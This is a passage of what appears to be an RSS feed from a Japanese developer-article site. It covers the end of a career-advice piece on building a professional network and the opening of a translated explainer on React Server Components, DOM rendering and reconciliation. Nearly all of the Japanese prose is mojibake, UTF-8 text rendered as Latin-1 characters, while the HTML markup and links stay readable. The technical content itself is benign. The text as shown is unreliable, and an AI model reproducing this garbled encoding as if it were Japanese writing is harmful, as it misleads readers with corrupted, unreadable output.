</ul><p>ãƒã‚¤ãƒ†ã‚¯æ¥­ç•Œã«å…¥ã£ã¦ã¾ã æ—¥ãŒæµ…ã„å ´åˆã€ãŠãã‚‰ãäººè„ˆã¨å‘¼ã¹ã‚‹ã‚ˆã†ãªã‚‚ã®ã¯ãªã„ã§ã—ã‚‡ã†ã€‚ã§ã‚‚å¤§ä¸ˆå¤«ã€‚ä»Šæ—¥ã‹ã‚‰ç¯‰ãå§‹ã‚ã‚Œã°ã„ã„ã®ã§ã™ã€‚ ğŸ˜„</p><p>æ–¹æ³•ã¯ã„ãã¤ã‚‚ã‚ã‚Šã¾ã™ã€‚ä¸€ç•ªæ‰‹ã£å–ã‚Šæ—©ã„ã®ãŒã€åœ°å…ƒã§é–‹å‚¬ã•ã‚Œã¦ã„ã‚‹ã‚ªãƒ•ä¼šã‚’æ¢ã™ã“ã¨ã§ã™ã€‚ã“ã†ã—ãŸã‚¤ãƒ™ãƒ³ãƒˆã«å‚åŠ ã™ã‚Œã°ã€è‡ªåˆ†ãŒå°±è·ã—ãŸã„ã¨æ€ã£ã¦ã„ã‚‹ä¼šç¤¾ã§åƒã„ã¦ã„ã‚‹é–‹ç™ºè€…ã«ä¼šãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã‚ãªãŸã®å¿œå‹Ÿæ›¸é¡ãŒåŸ‹ã‚‚ã‚Œã¦ã—ã¾ã‚ãªã„ã‚ˆã†æ‰‹åŠ©ã‘ã—ã¦ãã‚Œã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p><p>ã—ã‹ã—æ­£ç›´ãªã¨ã“ã‚ã€ã“ã‚Œã¯ç­†è€…ã®ã‚ˆã†ã«å†…å‘çš„ãªèª­è€…ã«ã¨ã£ã¦ã¯æœ€é©ãªæ–¹æ³•ã§ã¯ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ç­†è€…ãŒé§†ã‘å‡ºã—ã®é ƒã¯ã€åœ°å…ƒã®ã‚ªãƒ•ä¼šã«å‚åŠ ã—ã¦ã‚‚æ°—å¾Œã‚Œã—ã¦åˆå¯¾é¢ã®äººã«è©±ã—ã‹ã‘ã‚‹å‹‡æ°—ãŒã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚çµå±€ã‚³ãƒã‚’ä½œã‚‹ã“ã¨ã¯ã§ããšã€ä½•ã®å½¹ã«ã‚‚ç«‹ã¡ã¾ã›ã‚“ã§ã—ãŸã€‚ ğŸ˜…</p><p>å¹¸ã„ã€ä»–ã«ã‚‚å¤šãã®é¸æŠè‚¢ãŒã‚ã‚Šã¾ã™ã€‚ç­†è€…ã®å ´åˆã¯ã€è‡ªåˆ†ãŒãƒ“ãƒ«ãƒ‰ã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’ãƒãƒƒãƒˆä¸Šã«å…¬é–‹ã™ã‚‹ã“ã¨ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ç¯‰ãã¾ã—ãŸã€‚ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«è²¢çŒ®ã—ãŸã‚Šã€Discordã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§äº¤æµã—ãŸã‚Šã—ã¦ã‚‚ã„ã„ã§ã—ã‚‡ã†ã€‚ç­†è€…ã®ãƒ–ãƒ­ã‚°è¨˜äº‹â€œ<a href="https://www.joshwcomeau.com/career/no-cs-degree-required/">Becoming a Software Developer Without a CS Degree</a>â€ï¼ˆCSã®å­¦ä½ãŒãªãã¦ã‚‚ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºè€…ã«ãªã‚Œã‚‹æ–¹æ³•ï¼‰ã«æ›¸ã„ãŸã‚ˆã†ã«ã€è‡ªåˆ†ã®å¼·ã¿ã‚’ç”Ÿã‹ã™ã“ã¨ãŒæˆåŠŸã¸ã®è¿‘é“ã«ãªã‚Šã¾ã™ã€‚</p><p>ã¾ãŸã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚‚ãƒãƒ£ãƒ³ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ä¸Šã§åŠ©ã‘ã«ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚è…¹ç«‹ãŸã—ã„ã“ã¨ã«ã€ãƒãƒƒãƒˆä¸Šã«ã¯å˜ã«ãƒ‡ãƒ¼ã‚¿ã‚’é›†ã‚ã‚‹ã“ã¨ã ã‘ã‚’ç›®çš„ã¨ã—ãŸã€æ¶ç©ºã®ä¼šç¤¾ã®æ±‚äººãŒç„¡æ•°ã«ã‚ã‚Šã¾ã™ã€‚è‡ªåˆ†ã®LinkedInã®é€£çµ¡å…ˆã«ç™»éŒ²ã•ã‚Œã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å‹¤å‹™å…ˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã€æ³¨ç›®ã™ã¹ãå®Ÿåœ¨ã™ã‚‹ä¼æ¥­ã®ãƒªã‚¹ãƒˆã‚’ä½œæˆã™ã‚‹ã®ã‚‚è‰¯ã„ã§ã—ã‚‡ã†ã€‚</p><p>å³ã—ã„ä¸–ã®ä¸­ã§ã™ãŒã€ã“ã‚Œã‚‰ã®ãƒ’ãƒ³ãƒˆãŒæ™‚é–“ã¨åŠ´åŠ›ã®ç¯€ç´„ã«ãªã‚Œã°å¹¸ã„ã§ã™ã€‚â¤ï¸</p></div></div>
<div class="footnotes">
<hr>
<ol>
<li id="fn-1">ã‚¤ã‚±ã¦ã‚‹è‹¥è€…ã®é–“ã§ã¯"vibe coding"ã¨å‘¼ã°ã‚Œã¦ã„ã‚‹<a href="#fnref-1" class="footnote-backref">â†©</a></li>
<li id="fn-2">ãŸã ã—ã€ãã®å®¶åº­æ•™å¸«ã¯æ™‚ã€…å¤¢æƒ³çš„ã«ãªã‚‹ã®ã§ã€ææ¡ˆã«ã¯å°‘ã—ç”¨å¿ƒã—ãªã‘ã‚Œã°ãªã‚‰ãªã„ğŸ˜‚<a href="#fnref-2" class="footnote-backref">â†©</a></li>
</ol>
</div>]]></content:encoded></item><item><title><![CDATA[React Server Componentsã‚’ç†è§£ã™ã‚‹]]></title><description><![CDATA[React Server Componentsã‚’ç†è§£ã™ã‚‹ React Server Componentsï¼ˆRSCï¼‰ã®ç™»å ´ã«ã‚ˆã‚Šã€Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®é‡è¦æ€§ãŒé«˜ã¾ã‚Šã¾ã—â€¦]]></description><link>https://postd.cc/understanding-react-server-components/</link><guid isPermaLink="false">https://postd.cc/understanding-react-server-components/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[React]]></category><pubDate>Thu, 22 May 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<h2>React Server Componentsã‚’ç†è§£ã™ã‚‹</h2>
<p>React Server Componentsï¼ˆRSCï¼‰ã®ç™»å ´ã«ã‚ˆã‚Šã€Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®é‡è¦æ€§ãŒé«˜ã¾ã‚Šã¾ã—ãŸã€‚RSCã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã¯ä¸€éƒ¨ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã‚µãƒ¼ãƒãƒ¼å´ã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã—ã¤ã¤ã€æŠ½è±¡åŒ–ã«ã‚ˆã‚Šã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ã®éš”ãŸã‚Šã‚’æ„Ÿã˜ã•ã›ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ“ãƒªãƒ†ã‚£ã‚’å®Ÿç¾ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Client Componentsã¨Server Componentsã‚’ã‚³ãƒ¼ãƒ‰å†…ã«æ··åœ¨ã•ã›ã‚‹ã“ã¨ã§ã€ã™ã¹ã¦ã®ã‚³ãƒ¼ãƒ‰ãŒ1ã‚«æ‰€ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«è¦‹ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€æŠ½è±¡åŒ–ã«ã¯å¸¸ã«ã‚³ã‚¹ãƒˆãŒä¼´ã„ã¾ã™ã€‚ãã®ã‚³ã‚¹ãƒˆã¨ã¯ã©ã®ã‚ˆã†ãªã‚‚ã®ã§ã—ã‚‡ã†ã‹ã€‚RSCã¯ã„ã¤ã€Œä½¿ãˆã‚‹ã€ã®ã§ã—ã‚‡ã†ã‹ã€‚ãƒãƒ³ãƒ‰ãƒ«ã‚µã‚¤ã‚ºãŒå°ã•ããªã‚‹ã¨ã€å¸¯åŸŸå¹…ã‚‚ç‹­ã¾ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚RSCã‚’ã€Œä½¿ã†ã¹ãã€ã¨ãã¯ã„ã¤ã§ã—ã‚‡ã†ã‹ã€‚RSCã‚’é©åˆ‡ã«ä½¿ã†ä¸Šã§ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ãŒå¾“ã†ã¹ããƒ«ãƒ¼ãƒ«ã¯ä½•ã§ã—ã‚‡ã†ã‹ã€‚ãã®ãƒ«ãƒ¼ãƒ«ãŒå­˜åœ¨ã™ã‚‹ç†ç”±ã¯ä½•ã§ã—ã‚‡ã†ã‹ã€‚</p>
<p>ã“ã‚Œã‚‰ã®å•ã„ã«ç­”ãˆã‚‹ãŸã‚ã€RSCã®ä»•çµ„ã¿ã‚’è©³ã—ãè¦‹ã¦ã„ãã¾ã—ã‚‡ã†ã€‚Reactæœ¬ä½“ã¨ã€Reactã®ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ã„ã†RSCã®2ã¤ã®å´é¢ã«ã¤ã„ã¦è€ƒå¯Ÿã—ã¾ã™ã€‚ç‰¹ã«ã€RSCã«é–¢ã™ã‚‹æ­£ç¢ºãªãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«ã‚’æ§‹ç¯‰ã§ãã‚‹ã‚ˆã†ã€Reactã¨Next.jsã®å†…éƒ¨æ§‹é€ ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>ã“ã®è¨˜äº‹ã¯ã€Reactã‚’ä½¿ã„æ…£ã‚ŒãŸãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã‚’å¯¾è±¡ã¨ã—ã¦ã„ã¾ã™ã€‚èª­è€…ã«ã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚„ãƒ•ãƒƒã‚¯ã«é–¢ã™ã‚‹äºˆå‚™çŸ¥è­˜ãŒå‰ææ¡ä»¶ã¨ã—ã¦æ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚</p><p>ã¾ãŸã€JavaScriptã®Promiseã€asyncã€awaitã«ã¤ã„ã¦ã‚‚ç†ŸçŸ¥ã—ã¦ã„ã‚‹ã“ã¨ã‚’æƒ³å®šã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã«é–¢ã™ã‚‹çŸ¥è­˜ãŒãªã„æ–¹ã¯ã€<a href="https://youtu.be/fyGSyqEX2dw?si=MkRII6BoKW8Dm-Ml">Promiseã€asyncã€await</a>ã®ä»•çµ„ã¿ã«é–¢ã™ã‚‹ç­†è€…ã®YouTubeå‹•ç”»ã‚’ã”è¦§ãã ã•ã„ã€‚</p><p>Reactã®ã‚ã‚‰ã‚†ã‚‹å´é¢ã«ã¤ã„ã¦ã‚¼ãƒ­ã‹ã‚‰è©³ã—ãçŸ¥ã‚ŠãŸã„æ–¹ã¯ã€ç­†è€…ã®ã€Œ<a href="https://understandingreact.com/">Understanding React</a>ï¼ˆReactã‚’ç†è§£ã™ã‚‹ï¼‰ã€ã‚³ãƒ¼ã‚¹ã‚’ãœã²ãƒã‚§ãƒƒã‚¯ã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã“ã®ã‚³ãƒ¼ã‚¹ã§ã¯ã€Reactã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’æ˜ã‚Šä¸‹ã’ã‚‹ã“ã¨ã§ã€JSXã€Fiberã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã€ãƒ•ãƒƒã‚¯ã€ãƒ•ã‚©ãƒ¼ãƒ ãªã©ã®ä»•çµ„ã¿ã‚’ç†è§£ã—ã¦ã„ãŸã ãã“ã¨ãŒã§ãã¾ã™ã€‚</p></div></div>
<p>ã¾ãšã¯ã€RSCã®ä»•çµ„ã¿ã‚’ç†è§£ã™ã‚‹ãŸã‚ã«å¿…è¦ãªåŸºæœ¬ã‚’è¦‹ã¦ã„ãã¾ã—ã‚‡ã†</p>
<h2>DOMã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°</h2>
<p>Reactã§ã¯ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨ã„ã†è¡¨ç¾ã‚’å›ºæœ‰ã®æ„å‘³ã§ä½¿ã£ã¦ã„ã¾ã™ã€‚ä¸€èˆ¬çš„ã«ã¯ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒšãƒ¼ã‚¸ã‚’ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã™ã‚‹ã¨ã„ã†å ´åˆã€DOMã‚’ç”»é¢ã«æç”»ã™ã‚‹å‡¦ç†ã‚’ã„ã„ã¾ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€DOMï¼ˆè¦ç´ ã®ãƒ„ãƒªãƒ¼æ§‹é€ ï¼‰ã¨CSSOMï¼ˆè¨ˆç®—æ¸ˆã¿ã‚¹ã‚¿ã‚¤ãƒ«ã®ãƒ„ãƒªãƒ¼æ§‹é€ ï¼‰ã‚’ã‚‚ã¨ã«ã€å„è¦ç´ ã®é…ç½®ã‚’è¨ˆç®—ã—ã€é©åˆ‡ãªãƒ”ã‚¯ã‚»ãƒ«ã‚’ç”»é¢ã«æç”»ã—ã¾ã™ã€‚</p>
<p>ä¸€æ–¹ã€Reactã§ã¯ã€ŒDOMã®è¦‹ãŸç›®ã‚’è¨ˆç®—ã™ã‚‹ã“ã¨ã€ã‚’ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨ã„ã„ã¾ã™ã€‚é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒè¿”ã™å€¤ã¯Reactã«å¯¾ã—ã€DOMã®è¦‹ãŸç›®ã«é–¢ã™ã‚‹æƒ…å ±ã‚’ä¼ãˆã¾ã™ã€‚</p>
<p>ã—ãŸãŒã£ã¦ã€Reactï¼ˆãŠã‚ˆã³Reactã«è¿½éšã™ã‚‹å½¢ã§ç™»å ´ã—ãŸä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼‰ã®ä¸–ç•Œã§ã¯ã€ã€Œã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨ã„ã†å ´åˆã€<strong>ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨</strong>ã‚’ã„ã„ã¾ã™ã€‚</p>
<p>Reactã§ã„ã†ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¯ã€å¿…ãšã—ã‚‚ãƒ–ãƒ©ã‚¦ã‚¶ã«ã‚ˆã‚‹å®Ÿéš›ã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’ä¼´ã„ã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€DOMã®è¦‹ãŸç›®ãŒã™ã§ã«ReactãŒã“ã†ã‚ã‚‹ã¹ãã¨è€ƒãˆã‚‹è¦‹ãŸç›®ã«ãªã£ã¦ã„ã‚‹å ´åˆãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚</p>
<p>å®Ÿéš›ã€Reactã®ã‚³ã‚¢ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ï¼ˆãŠã‚ˆã³ä»–ã®ã™ã¹ã¦ã®JSãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼‰ã«ãŠã‘ã‚‹é‡è¦ãªç‚¹ã¯ã€å†…éƒ¨ã‚³ãƒ¼ãƒ‰ãŒæ›´æ–°ã™ã‚‹DOMã®é‡ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ã«ã‚ã‚Šã¾ã™ã€‚</p>
<h2>ãƒ„ãƒªãƒ¼ã®å·®åˆ†æ¤œå‡ºå‡¦ç†</h2>
<p>Reactã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ä¸­ã«ã¯ã€<code class="language-text">appendChild</code>ãªã©ã®ãƒ–ãƒ©ã‚¦ã‚¶DOM APIã‚’å‘¼ã³å‡ºã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã®DOMã‚’æ›´æ–°ã™ã‚‹ã‚³ãƒ¼ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚Reactã¯ã€ãƒ„ãƒªãƒ¼ã®å·®åˆ†æ¤œå‡ºå‡¦ç†ï¼ˆreconciliationï¼‰ã‚„å·®åˆ†è¨ˆç®—ï¼ˆdiffï¼‰ã«ã‚ˆã£ã¦ã€ãƒ–ãƒ©ã‚¦ã‚¶DOM APIã‚’å®Ÿè¡Œã™ã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’æ±ºã‚ã¾ã™ã€‚</p>
<p><a href="https://tonyalicea.dev/blog/understanding-react-compiler">React Compiler</a>ã«é–¢ã™ã‚‹è¨˜äº‹ã«æ›¸ã„ãŸã‚ˆã†ã«ã€Reactã¯DOMã®ç¾åœ¨ã®è¦‹ãŸç›®ã¨ã€è¦‹ãŸç›®ãŒã©ã†ã‚ã‚‹ã¹ãã‹ã‚’JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãƒ„ãƒªãƒ¼ã§ç®¡ç†ã—ã¦ãŠã‚Šã€å„ãƒãƒ¼ãƒ‰ã¯Fiberã¨å‘¼ã°ã‚Œã¾ã™ã€‚</p>
<p>Reactã¯ã€JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãƒ„ãƒªãƒ¼ã®2ã¤ã®æã§DOMã®è¦‹ãŸç›®ãŒã©ã†ã‚ã‚‹ã¹ãã‹ï¼ˆã€ŒWORK-IN-PROGRESSã€ï¼‰ã‚’è¨ˆç®—ã—ã€DOMã®ç¾åœ¨ã®è¦‹ãŸç›®ï¼ˆã€ŒCURRENTã€ï¼‰ã¨æ¯”è¼ƒã—ã¾ã™ã€‚</p>
<p>æ¬¡ã«ã€2ã¤ã®ãƒ„ãƒªãƒ¼ã®å·®åˆ†ã‚’æ¤œå‡ºã—ã€currentãƒ„ãƒªãƒ¼ã‚’workInProgressãƒ„ãƒªãƒ¼ã«å¤‰æ›ã™ã‚‹ãŸã‚ã«å¿…è¦ãªã‚¹ãƒ†ãƒƒãƒ—ã‚’è¨ˆç®—ã—ã¾ã™ã€‚ãã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€Œdiffã€ã¨ã€Œpatchã€ï¼ˆãƒ‘ãƒƒãƒå‡¦ç†ï¼‰ã§ã™ã€‚</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/ReactCompiler_Reconciliation.png"></p>
<p>å˜ç´”ãªJavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ã®æ¯”è¼ƒè¨ˆç®—ãŒçµ‚ã‚ã‚‹ã¨ã€å®Ÿéš›ã®DOMã«ãŠã„ã¦å–ã‚‹ã¹ãã‚¹ãƒ†ãƒƒãƒ—ãŒæ˜ã‚‰ã‹ã«ãªã‚Šã¾ã™ã€‚DOMã®æ›´æ–°ã¯ã‚³ã‚¹ãƒˆãŒã‹ã‹ã‚Šã€ãƒ–ãƒ©ã‚¦ã‚¶ã®å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆè¦ç´ ã®é…ç½®ã¨ãƒ”ã‚¯ã‚»ãƒ«ã®æç”»ï¼‰ã‚’ä¼´ã†ãŸã‚ã€æœ€ä½é™å–ã‚‹ã¹ãã‚¹ãƒ†ãƒƒãƒ—ã®æ•°ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã§ã€DOMã«å¯¾ã—ã¦å¿…è¦ãªæ›´æ–°ã‚’æœ€å°é™ã«ã¨ã©ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§DOMã‚’æ›´æ–°ã™ã‚Œã°ã€UIã‚’æ›´æ–°ã™ã‚‹éš›ã«stateã‚’ä¿æŒã§ãã‚‹ãƒ¡ãƒªãƒƒãƒˆãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ•ã‚©ãƒ¼ãƒ ã«æƒ…å ±ã‚’å…¥åŠ›ã—ã€ReactãŒä½•ã‚‰ã‹ã®ã‚¤ãƒ™ãƒ³ãƒˆã‚’ã‚‚ã¨ã«UIã‚’æ›´æ–°ã—ã¦ã‚‚ã€å…¥åŠ›ã—ãŸãƒ†ã‚­ã‚¹ãƒˆã¯ãƒ•ã‚©ãƒ¼ãƒ ä¸Šã«ä¿æŒã•ã‚Œã¾ã™ï¼ˆãƒšãƒ¼ã‚¸ãŒå†èª­ã¿è¾¼ã¿ã•ã‚ŒãŸå ´åˆã¯ä¿æŒã•ã‚Œã¾ã›ã‚“ï¼‰ã€‚</p>
<p>ã—ãŸãŒã£ã¦ã€Reactã§ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§DOMã‚’æ›´æ–°ã™ã‚‹ã“ã¨ã‚’é‡è¦–ã—ã¦ãŠã‚Šã€æœ€åˆã«å½ã®DOMã«å¯¾ã—ã¦å‡¦ç†ã‚’è¡Œã†ã“ã¨ã§å¯èƒ½ãªé™ã‚ŠåŠ¹ç‡çš„ã«æ›´æ–°ã—ã‚ˆã†ã¨åŠªã‚ã¦ã„ã¾ã™ã€‚ã“ã®ã‚ˆã†ãªJavaScriptã®DOMæ§‹é€ ã®å½ã‚³ãƒ”ãƒ¼ã‚’ä¸€èˆ¬çš„ã«ã€Œä»®æƒ³DOMã€ã¨å‘¼ã³ã¾ã™ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>ã€Œä»®æƒ³DOMã€ã¯é©åˆ‡ãªè¡¨ç¾ã‹ï¼Ÿ</strong></p><p>Reactã«ãŠã‘ã‚‹DOMã¨ä¼¼ãŸæ§‹é€ ã®JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®é›†ã¾ã‚Šã‚’ä»¥å‰ã¯ã€Œä»®æƒ³DOMã€ã¨å‘¼ã‚“ã§ã„ã¾ã—ãŸã€‚ã—ã‹ã—ã€å®Ÿéš›ã¯iOSã‚„Androidã®ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¢ãƒ—ãƒªï¼ˆReact Nativeï¼‰ãªã©ã¸ã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãŒå¯èƒ½ãªãŸã‚ã€Reactã¯ä»Šã§ã¯ã“ã®å‘¼ç§°ã‚’å¥½ã‚“ã§ã„ã¾ã›ã‚“ã€‚</p><p>å®Ÿéš›ã€Reactã¯è¤‡æ•°ã®ãƒ„ãƒªãƒ¼ã‚’æ‰±ã„ã¾ã™ã€‚é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒè¿”ã™Reactè¦ç´ ï¼ˆJSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼‰ã®ãƒ„ãƒªãƒ¼ã‚„ã€Reactè¦ç´ ã‚’å¤‰æ›ã—ãŸã‚‚ã®ã§ã€stateãªã©ã‚’æ ¼ç´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ Fiberï¼ˆåŒã˜ãJSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼‰ã®ãƒ„ãƒªãƒ¼ãªã©ã§ã™ã€‚ </p><p>æ™®æ®µã¯ã‚ˆã‚Šå…·ä½“çš„ãªåå‰ã§ã“ã‚Œã‚‰ã®ãƒ„ãƒªãƒ¼ã‚’å‘¼ã³ã¾ã™ãŒã€ã“ã®è¨˜äº‹ã§ã¯ã€RSCã®ä»•çµ„ã¿ã‚’ç†è§£ã™ã‚‹ã†ãˆã§ä¾¿åˆ©ãªã®ã§ã€æ˜”ã‹ã‚‰æ—¥å¸¸ä¼šè©±ã§ã‚ˆãä½¿ã‚ã‚Œã¦ã„ã‚‹ã€Œä»®æƒ³DOMã€ã¨ã„ã†å‘¼ç§°ã‚’ä½¿ã„ãŸã„ã¨æ€ã„ã¾ã™ã€‚</p></div></div>
<p>ReactãŒã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨å‘¼ã¶ã®ã¯ã€ä»®æƒ³DOMã®è¨ˆç®—å‡¦ç†ã§ã™ã€‚å…·ä½“çš„ã«ã¯ã€é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã—ã€ãƒªã‚¢ãƒ«DOMã®è¦‹ãŸç›®ãŒã©ã†ã‚ã‚‹ã¹ãã‹ã‚’æ±ºã‚ã‚‹ã“ã¨ã‚’ã„ã„ã¾ã™ã€‚ã“ã®å‡¦ç†ã¯ã™ã¹ã¦é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹JavaScriptã‚¨ãƒ³ã‚¸ãƒ³ã®ä¸­ã§ã€ãƒªã‚¢ãƒ«DOMã«åæ˜ ã•ã‚Œã‚‹å·®åˆ†ãŒå…¨ãæ¤œå‡ºã•ã‚Œãªããªã‚‹ã¾ã§è¡Œã‚ã‚Œã¾ã™ã€‚</p>
<p><strong>ReactãŒã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨ã„ã†è¡¨ç¾ã‚’ä½¿ã†ç†ç”±</strong>ã‚’ç†è§£ã™ã‚‹ã¨ã€RSCã‚’æ­£ç¢ºã«èª¬æ˜ã™ã‚‹ã†ãˆã§éå¸¸ã«å½¹ç«‹ã¡ã¾ã™ã€‚</p>
<p>RSCã‚’ç†è§£ã™ã‚‹ãŸã‚ã«ã¯ã€Webé–‹ç™ºã«ãŠã‘ã‚‹ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãŠã‚ˆã³ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã¨ã€ReactãŒé‡ç‚¹ã‚’ç½®ãä»®æƒ³DOMã®ç”Ÿæˆã®é•ã„ã‚’æ˜ç¢ºã«ç†è§£ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>Reactã§ã„ã†ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã§ã¯ã€å®Ÿéš›ã«ã¯å¿…ãšã—ã‚‚ä½•ã‹ãŒç›®ã«è¦‹ãˆã‚‹å½¢ã§èµ·ã“ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/tonyalicea_cartoon1_dark.png"></p>
